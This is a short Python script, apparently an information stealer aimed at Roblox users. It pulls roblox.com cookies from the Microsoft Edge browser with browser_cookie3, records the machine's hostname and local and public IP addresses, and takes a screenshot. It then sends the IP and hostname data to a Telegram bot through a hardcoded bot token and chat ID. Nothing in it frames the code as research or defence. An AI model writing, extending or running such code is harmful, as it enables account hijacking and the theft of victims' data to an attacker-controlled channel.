import socket
import requests
from requests import get
from PIL import ImageGrab
import os
import random
import browser_cookie3

def getCookiesFromDomain(domain,cookieName=''):

    Cookies={}
    chromeCookies = list(browser_cookie3.edge())

    for cookie in chromeCookies:

        if (domain in cookie.domain):
            Cookies[cookie.name]=cookie.value

    if(cookieName!=''):
        try:
            return Cookies[cookieName]
        except:
            return {}
    else:
        return Cookies

print(getCookiesFromDomain("roblox.com", ""))








hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text

print(f'host: {hostname}')
print(f'lip: {local_ip}')
print(f'pip: {public_ip}')


randname = f"{hostname}-{str(random.randint(111111,999999))}"
screen = ImageGrab.grab()
screen.save(os.getcwd() + f'\\screen{randname}.jpg')



token = "5701589055:AAHL1gbfBrCO6PFf-wGoOJe9QdQRmUNIC-0"
chat_id = "1104502854"
text = (f"local ip = {local_ip} ,public ip = {public_ip} ,hostname = {hostname} ")
url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text
results = requests.get(url_req)